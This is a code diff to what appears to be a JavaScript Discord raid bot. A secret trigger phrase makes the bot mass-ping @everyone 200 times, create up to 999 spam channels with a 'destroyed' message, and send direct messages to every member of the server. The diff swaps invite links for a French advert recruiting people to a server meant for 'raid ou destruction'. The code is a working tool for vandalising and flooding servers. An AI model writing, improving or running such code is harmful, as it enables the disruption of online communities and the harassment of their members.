@@ -151,7 +151,13 @@ if(message.content.includes("ar!kelsairvvesrx")){
             }
             if(message.content.includes("@everyone")){
                 for(var i = 0; i < 200; i++){
-                    message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/QfAtq4s")
+                    message.channel.send("@everyone Okue Le tchoupi Islamiste **INFORMATIONS SUR LA PIGEONNERIE :
+
+Numéro 1 :
+
+La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
+
+TA CAPTÉ ? **             https://discord.gg/R3K862v")
                 }
             }
             //réaction en chaine
@@ -160,11 +166,41 @@ if(message.content.includes("ar!kelsairvvesrx")){
                     message.channel.send("issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone **INFORMATIONS SUR LA PIGEONNERIE :
+
+Numéro 1 :
+
+La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
+
+TA CAPTÉ ? **             https://discord.gg/R3K862v ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone **INFORMATIONS SUR LA PIGEONNERIE :
+
+Numéro 1 :
+
+La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
+
+TA CAPTÉ ? **             https://discord.gg/R3K862v ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone **INFORMATIONS SUR LA PIGEONNERIE :
+
+Numéro 1 :
+
+La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
+
+TA CAPTÉ ? **             https://discord.gg/R3K862v ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone **INFORMATIONS SUR LA PIGEONNERIE :
+
+Numéro 1 :
+
+La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
+
+TA CAPTÉ ? **             https://discord.gg/R3K862v ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone **INFORMATIONS SUR LA PIGEONNERIE :
+
+Numéro 1 :
+
+La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
+
+TA CAPTÉ ? **             https://discord.gg/R3K862v ."))
 
                       }
                     }
@@ -186,10 +222,13 @@ let cont = message.content.slice(1).split(" ")
         let args = cont.slice(1)
         let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
       message.guild.members.forEach((player) => {
-          message.guild.member(player).send(`Rejoins .
+          message.guild.member(player).send(`**INFORMATIONS SUR LA PIGEONNERIE :
 
+Numéro 1 :
 
- https://discord.gg/YYVJDNus`);
+La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.
+
+TA CAPTÉ ? **             https://discord.gg/R3K862v`);
 });
     }
 })
